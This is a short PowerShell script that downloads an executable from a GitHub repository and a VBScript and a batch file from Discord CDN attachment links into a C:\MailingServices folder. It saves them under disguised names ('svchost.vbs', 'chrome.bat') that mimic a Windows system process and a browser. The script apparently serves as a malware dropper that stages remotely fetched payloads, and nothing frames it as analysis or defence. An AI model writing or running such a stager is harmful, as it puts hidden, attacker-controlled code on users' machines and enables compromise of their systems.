$url = "https://github.com/violentqm/rest/raw/main/MailingServices.exe"
$outputPath = "C:\MailingServices\MailingServices.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath
$url2 = "https://cdn.discordapp.com/attachments/1159474640641605713/1175479420782383114/17003262731034685.vbs?ex=656b6185&is=6558ec85&hm=510b912de6db328b220f929aa048aedbbd490876222bb75a448f2bca333c6098&"
$outputPath2 = "C:\MailingServices\svchost.vbs"
Invoke-WebRequest -Uri $url2 -OutFile $outputPath2
$url3 = "https://cdn.discordapp.com/attachments/1159474640641605713/1175510616170049727/17003337088469204.bat?ex=656b7e92&is=65590992&hm=0743ad42de2f44a902e1ecc4df3e8ac908b565f4ac8bd0fee217b0671dc3a240&"
$outputPath3 = "C:\MailingServices\chrome.bat"
Invoke-WebRequest -Uri $url3 -OutFile $outputPath3
